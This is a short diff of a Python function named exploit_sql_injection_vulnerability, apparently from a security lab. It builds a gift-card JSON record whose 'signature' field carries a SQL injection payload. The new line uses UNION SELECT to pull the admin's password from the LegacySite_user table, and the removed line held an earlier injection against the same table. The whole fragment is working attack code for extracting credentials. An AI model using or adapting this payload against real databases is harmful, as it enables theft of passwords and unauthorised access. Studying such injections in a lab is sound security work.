@@ -253,9 +253,9 @@ def exploit_sql_injection_vulnerability():
             {
                 "record_type": "amount_change",
                 "amount_added": 2000,
-                "signature": "74891960f9ab25d407967c106ddf4093'); SELECT * FROM LegacySite_user WHERE username = 'admin'; --",
+                "signature":  "74891960f9ab25d407967c106ddf4093%' UNION SELECT password FROM LegacySite_user WHERE username LIKE '%admin"
             }
-        ],
+        ]
     }
     res = json.dumps(new_card, indent=2).encode('utf-8')
     return res
